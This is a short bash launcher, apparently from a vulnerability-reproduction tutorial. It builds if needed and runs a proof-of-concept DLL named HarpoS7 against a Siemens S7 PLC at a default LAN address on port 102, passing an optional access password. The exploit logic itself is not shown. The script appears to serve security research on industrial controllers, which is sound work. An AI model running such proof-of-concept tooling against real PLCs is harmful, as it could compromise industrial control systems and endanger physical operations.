#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
cd "$ROOT_DIR"

source tutorials/s7plus/vuln_repro/env.sh

TARGET="${S7_TARGET:-192.168.0.13}"
PORT="${S7_PORT:-102}"
PASSWORD="${S7_ACCESS_PASSWORD:-}"
POC_DLL="tutorials/s7plus/vuln_repro/poc_sources/harpos7/HarpoS7/HarpoS7.PoC/bin/Release/net8.0/HarpoS7.PoC.dll"

if [ ! -f "$POC_DLL" ]; then
  tutorials/s7plus/vuln_repro/build_harpos7.sh
fi

if [ -n "$PASSWORD" ]; then
  dotnet "$POC_DLL" "$TARGET:$PORT" "$PASSWORD"
else
  dotnet "$POC_DLL" "$TARGET:$PORT"
fi
